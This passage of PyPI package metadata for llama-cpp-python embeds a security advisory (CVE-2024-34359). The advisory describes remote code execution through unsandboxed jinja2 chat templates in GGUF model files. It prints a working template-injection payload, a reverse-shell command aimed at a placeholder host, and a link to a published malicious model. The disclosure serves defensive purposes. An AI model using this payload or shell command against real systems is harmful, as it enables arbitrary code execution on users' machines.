``llama_chat_format.py:Jinja2ChatFormatter:call -> self._environment.render(`\n\n*(The uploaded malicious model file is in https://huggingface.co/Retr0REG/Whats-up-gguf )*\n\n```python\nfrom llama_cpp import Llama\n\n# Loading locally:\nmodel = Llama(model_path=\"qwen1_5-0_5b-chat-q2_k.gguf\")\n# Or loading from huggingface:\nmodel = Llama.from_pretrained(\n    repo_id=\"Retr0REG/Whats-up-gguf\",\n    filename=\"qwen1_5-0_5b-chat-q2_k.gguf\",\n    verbose=False\n)\n\nprint(model.create_chat_completion(messages=[{\"role\": \"user\",\"content\": \"what is the meaning of life?\"}]))\n```\n\nNow when the model is loaded whether as ` Llama.from_pretrained` or `Llama` and chatted, our malicious code in the `chat_template` of the `metahead` will be triggered and execute arbitrary code. \n\nPoC video here: https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing\n","fixed_in":["0.2.72"],"id":"GHSA-56xg-wfcc-g829","link":"https://osv.dev/vulnerability/GHSA-56xg-wfcc-g829","source":"osv","summary":null,"withdrawn":null}]},"0.2.71":{"info":{"author":null,"author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":null,"license":"MIT","maintainer":null,"maintainer_email":null,"name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.71/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","PyYAML>=5.1; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.71","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"c9054623a2861963a42f66358fbdd38e3c202ff97784ec1d8c1fa7011e24064d","md5":"0cfc961217c9fdfd9b1616f225fa6968","sha256":"47d55acbe7ce9795b53ca801620def50bae60fb3fffbc476d17ae4e9f3b9460a"},"downloads":-1,"filename":"llama_cpp_python-0.2.71.tar.gz","has_sig":false,"md5_digest":"0cfc961217c9fdfd9b1616f225fa6968","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":48387416,"upload_time":"2024-05-09T07:05:28","upload_time_iso_8601":"2024-05-09T07:05:28.648201Z","url":"https://files.pythonhosted.org/packages/c9/05/4623a2861963a42f66358fbdd38e3c202ff97784ec1d8c1fa7011e24064d/llama_cpp_python-0.2.71.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-34359"],"details":"## Description\n\n`llama-cpp-python` depends on class `Llama` in `llama.py` to load `.gguf` llama.cpp or Latency Machine Learning Models. The `__init__` constructor built in the `Llama` takes several parameters to configure the loading and running of the model. Other than `NUMA, LoRa settings`, `loading tokenizers,` and `hardware settings`, `__init__` also loads the `chat template` from targeted `.gguf` 's Metadata and furtherly parses it to `llama_chat_format.Jinja2ChatFormatter.to_chat_handler()` to construct the `self.chat_handler` for this model. Nevertheless, `Jinja2ChatFormatter` parse the `chat template` within the Metadate with sandbox-less `jinja2.Environment`, which is furthermore rendered in `__call__` to construct the `prompt` of interaction. This allows `jinja2` Server Side Template Injection which leads to RCE by a carefully constructed payload.\n\n## Source-to-Sink\n\n### `llama.py` -> `class Llama` -> `__init__`:\n\n```python\nclass Llama:\n    \"\"\"High-level Python wrapper for a llama.cpp model.\"\"\"\n\n    __backend_initialized = False\n\n    def __init__(\n        self,\n        model_path: str,\n\t\t# lots of params; Ignoring\n    ):\n \n        self.verbose = verbose\n\n        set_verbose(verbose)\n\n        if not Llama.__backend_initialized:\n            with suppress_stdout_stderr(disable=verbose):\n                llama_cpp.llama_backend_init()\n            Llama.__backend_initialized = True\n\n\t\t# Ignoring lines of unrelated codes.....\n\n        try:\n            self.metadata = self._model.metadata()\n        except Exception as e:\n            self.metadata = {}\n            if self.verbose:\n                print(f\"Failed to load metadata: {e}\", file=sys.stderr)\n\n        if self.verbose:\n            print(f\"Model metadata: {self.metadata}\", file=sys.stderr)\n\n        if (\n            self.chat_format is None\n            and self.chat_handler is None\n            and \"tokenizer.chat_template\" in self.metadata\n        ):\n            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(\n                self.metadata\n            )\n\n            if chat_format is not None:\n                self.chat_format = chat_format\n                if self.verbose:\n                    print(f\"Guessed chat format: {chat_format}\", file=sys.stderr)\n            else:\n                template = self.metadata[\"tokenizer.chat_template\"]\n                try:\n                    eos_token_id = int(self.metadata[\"tokenizer.ggml.eos_token_id\"])\n                except:\n                    eos_token_id = self.token_eos()\n                try:\n                    bos_token_id = int(self.metadata[\"tokenizer.ggml.bos_token_id\"])\n                except:\n                    bos_token_id = self.token_bos()\n\n                eos_token = self._model.token_get_text(eos_token_id)\n                bos_token = self._model.token_get_text(bos_token_id)\n\n                if self.verbose:\n                    print(f\"Using gguf chat template: {template}\", file=sys.stderr)\n                    print(f\"Using chat eos_token: {eos_token}\", file=sys.stderr)\n                    print(f\"Using chat bos_token: {bos_token}\", file=sys.stderr)\n\n                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(\n                    template=template,\n                    eos_token=eos_token,\n                    bos_token=bos_token,\n                    stop_token_ids=[eos_token_id],\n                ).to_chat_handler()\n\n        if self.chat_format is None and self.chat_handler is None:\n            self.chat_format = \"llama-2\"\n            if self.verbose:\n                print(f\"Using fallback chat format: {chat_format}\", file=sys.stderr)\n                \n```\n\nIn `llama.py`, `llama-cpp-python` defined the fundamental class for model initialization parsing (Including `NUMA, LoRa settings`, `loading tokenizers,` and stuff ). In our case, we will be focusing on the parts where it processes `metadata`; it first checks if `chat_format` and `chat_handler` are `None` and checks if the key `tokenizer.chat_template` exists in the metadata dictionary `self.metadata`. If it exists, it will try to guess the `chat format` from the `metadata`. If the guess fails, it will get the value of `chat_template` directly from `self.metadata.self.metadata` is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the `chat_template` is parsed into `llama_chat_format.Jinja2ChatFormatter` as params which furthermore stored the `to_chat_handler()` as `chat_handler`\n\n### `llama_chat_format.py` -> `Jinja2ChatFormatter`:\n\n`self._environment =  jinja2.Environment( -> from_string(self.template) -> self._environment.render(`\n\n```python\nclass ChatFormatter(Protocol):\n    \"\"\"Base Protocol for a chat formatter. A chat formatter is a function that\n    takes a list of messages and returns a chat format response which can be used\n    to generate a completion. The response can also include a stop token or list\n    of stop tokens to use for the completion.\"\"\"\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        **kwargs: Any,\n    ) -> ChatFormatterResponse: ...\n\n\nclass Jinja2ChatFormatter(ChatFormatter):\n    def __init__(\n        self,\n        template: str,\n        eos_token: str,\n        bos_token: str,\n        add_generation_prompt: bool = True,\n        stop_token_ids: Optional[List[int]] = None,\n    ):\n        \"\"\"A chat formatter that uses jinja2 templates to format the prompt.\"\"\"\n        self.template = template\n        self.eos_token = eos_token\n        self.bos_token = bos_token\n        self.add_generation_prompt = add_generation_prompt\n        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None\n\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render(\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n\n```\n\nAs we can see in `llama_chat_format.py` -> `Jinja2ChatFormatter`, the constructor `__init__` initialized required `members` inside of the class; Nevertheless, focusing on this line:\n\n```python\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n```\n\nFun thing here: `llama_cpp_python` directly loads the `self.template` (`self.template = template` which is the `chat template` located in the `Metadate` that is parsed as a param) via `jinja2.Environment.from_string(` without setting any sandbox flag or using the protected `immutablesandboxedenvironment `class. This is extremely unsafe since the attacker can implicitly tell `llama_cpp_python` to load malicious `chat template` which is furthermore rendered in the `__call__` constructor, allowing RCEs or Denial-of-Service since `jinja2`'s renderer evaluates embed codes like `eval()`, and we can utilize expose method by exploring the attribution such as `__globals__`, `__subclasses__` of pretty much anything.\n\n```python\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render( # rendered!\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n```\n\n## Exploiting\n\nFor our exploitation, we first downloaded [qwen1_5-0_5b-chat-q2_k.gguf](https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf) of `Qwen/Qwen1.5-0.5B-Chat-GGUF` on `huggingface` as the base of the exploitation, by importing the file to `Hex-compatible` editors (In my case I used the built-in `Hex editor` or `vscode`), you can try to search for key `chat_template` (imported as `template = self.metadata[\"tokenizer.chat_template\"]` in `llama-cpp-python`):\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png\" alt=\"image-20240502180804562\" style=\"zoom: 25%;\" />\n\n`qwen1_5-0_5b-chat-q2_k.gguf` appears to be using the OG `role+message` and using the fun `jinja2` syntax. By first replacing the original `chat_template` in `\\x00`, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression `().__class__.__base__.__subclasses__()` retrieves a list of all subclasses of the basic `object` class and then we check if its `warning` by `if \"warning\" in x.__name__`, if it is , we access its module via the `_module` attribute then access Python's built-in functions through `__builtins__` and uses the `__import__` function to import the `os` module and finally we called `os.popen` to `touch /tmp/retr0reg`, create an empty file call `retr0reg` under `/tmp/`\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"touch /tmp/retr0reg\")}}{%endif%}{% endfor %}\n```\n\nin real life exploiting instance, we can change `touch /tmp/retr0reg` into arbitrary codes like `sh -i >& /dev/tcp/<HOST>/<PORT> 0>&1` to create a reverse shell connection to specified host, in our case we are using `touch /tmp/retr0reg` to showcase the exploitability of this vulnerability.\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png\" alt=\"image-20240502200909127\" style=\"zoom:50%;\" />\n\nAfter these steps, we got ourselves a malicious model with an embedded payload in `chat_template` of the `metahead`, in which will be parsed and rendered by `llama.py:class Llama:init ->  self.chat_handler `-> `llama_chat_format.py:Jinja2ChatFormatter:init ->  self._environment = jinja2.Environment(` -> ``llama_chat_format.py:Jinja2ChatFormatter:call -> self._environment.render(`\n\n*(The uploaded malicious model file is in https://huggingface.co/Retr0REG/Whats-up-gguf )*\n\n```python\nfrom llama_cpp import Llama\n\n# Loading locally:\nmodel = Llama(model_path=\"qwen1_5-0_5b-chat-q2_k.gguf\")\n# Or loading from huggingface:\nmodel = Llama.from_pretrained(\n    repo_id=\"Retr0REG/Whats-up-gguf\",\n    filename=\"qwen1_5-0_5b-chat-q2_k.gguf\",\n    verbose=False\n)\n\nprint(model.create_chat_completion(messages=[{\"role\": \"user\",\"content\": \"what is the meaning of life?\"}]))\n```\n\nNow when the model is loaded whether as ` Llama.from_pretrained` or `Llama` and chatted, our malicious code in the `chat_template` of the `metahead` will be triggered and execute arbitrary code. \n\nPoC video here: https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing\n","fixed_in":["0.2.72"],"id":"GHSA-56xg-wfcc-g829","link":"https://osv.dev/vulnerability/GHSA-56xg-wfcc-g829","source":"osv","summary":null,"withdrawn":null}]},"0.2.72":{"info":{"author":null,"author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":null,"license":"MIT","maintainer":null,"maintainer_email":null,"name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.72/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","PyYAML>=5.1; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.72","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"714b2a2d4e69d5e4600655713678ac95d19c5e882623721680921a2eda0921ce","md5":"2e66bdba20b0f3dacba8166b8a5cca74","sha256":"7da4957043927f73d4425c919c843581e5a3ceb5e65cafbc29bfb45703814a56"},"downloads":-1,"filename":"llama_cpp_python-0.2.72.tar.gz","has_sig":false,"md5_digest":"2e66bdba20b0f3dacba8166b8a5cca74","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":49506506,"upload_time":"2024-05-10T04:59:24","upload_time_iso_8601":"2024-05-10T04:59:24.581011Z","url":"https://files.pythonhosted.org/packages/71/4b/2a2d4e69d5e4600655713678ac95d19c5e882623721680921a2eda0921ce/llama_cpp_python-0.2.72.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.73":{"info":{"author":null,"author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":null,"license":"MIT","maintainer":null,"maintainer_email":null,"name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.73/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","PyYAML>=5.1; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.73","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"c0c6986827c26b1c746be0d5ac0ba545a5e76385f28be628ea4238cdb9e1cc73","md5":"6bd9579d24737a41080ba08099b02868","sha256":"78ac8d5f7fa06090255f0b64bf6acf2bc864c32447a1e9fbdf553f7b199fea07"},"downloads":-1,"filename":"llama_cpp_python-0.2.73.tar.gz","has_sig":false,"md5_digest":"6bd9579d24737a41080ba08099b02868","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":49136242,"upload_time":"2024-05-10T13:49:16","upload_time_iso_8601":"2024-05-10T13:49:16.985658Z","url":"https://files.pythonhosted.org/packages/c0/c6/986827c26b1c746be0d5ac0ba545a5e76385f28be628ea4238cdb9e1cc73/llama_cpp_python-0.2.73.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.74":{"info":{"author":null,"author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":null,"license":"MIT","maintainer":null,"maintainer_email":null,"name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.74/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","PyYAML>=5.1; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.74","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"fe7a9c22611417bd8087bd709d51726af950b9587790903d0fa6f5b894e024c8","md5":"3bfa22dd9a9a03a4ff6fdd1014b72bc7","sha256":"2da38f4e58cfd1d742da2d944d1e3cc0256a8c466698920230497d7e361287c8"},"downloads":-1,"filename":"llama_cpp_python-0.2.74.tar.gz","has_sig":false,"md5_digest":"3bfa22dd9a9a03a4ff6fdd1014b72bc7","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":49154785,"upload_time":"2024-05-12T14:35:05","upload_time_iso_8601":"2024-05-12T14:35:05.911469Z","url":"https://files.pythonhosted.org/packages/fe/7a/9c22611417bd8087bd709d51726af950b9587790903d0fa6f5b894e024c8/llama_cpp_python-0.2.74.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.75":{"info":{"author":null,"author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":null,"license":"MIT","maintainer":null,"maintainer_email":null,"name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.75/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","PyYAML>=5.1; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.75","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"d871ea384e5dfad3875bbc936b56a39f6eb9216d84cbd637d07dd45a00815d9a","md5":"4243342493ddb0ef7afc0242c7b143a0","sha256":"aee9383935c42e812ee84265b1dafe5f0e3a20ee47216529b64a2ed6caaaed44"},"downloads":-1,"filename":"llama_cpp_python-0.2.75.tar.gz","has_sig":false,"md5_digest":"4243342493ddb0ef7afc0242c7b143a0","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":48686474,"upload_time":"2024-05-16T04:43:57","upload_time_iso_8601":"2024-05-16T04:43:57.884521Z","url":"https://files.pythonhosted.org/packages/d8/71/ea384e5dfad3875bbc936b56a39f6eb9216d84cbd637d07dd45a00815d9a/llama_cpp_python-0.2.75.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.76":{"info":{"author":null,"author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":null,"license":"MIT","maintainer":null,"maintainer_email":null,"name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.76/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","PyYAML>=5.1; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.76","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"39bdb115d123496f05ba7b6de938abaa0e83373b8c8706200ccb9dbb2ab8918a","md5":"05ed30cdda5fb2339b8f3a8764151b49","sha256":"a4e2ab6b74dc87f565a21e4f1617c030f92d5b341375d7173876d238613a50ab"},"downloads":-1,"filename":"llama_cpp_python-0.2.76.tar.gz","has_sig":false,"md5_digest":"05ed30cdda5fb2339b8f3a8764151b49","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":49373083,"upload_time":"2024-05-24T06:01:44","upload_time_iso_8601":"2024-05-24T06:01:44.054636Z","url":"https://files.pythonhosted.org/packages/39/bd/b115d123496f05ba7b6de938abaa0e83373b8c8706200ccb9dbb2ab8918a/llama_cpp_python-0.2.76.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.77":{"info":{"author":null,"author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":null,"license":"MIT","maintainer":null,"maintainer_email":null,"name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.77/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","PyYAML>=5.1; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == 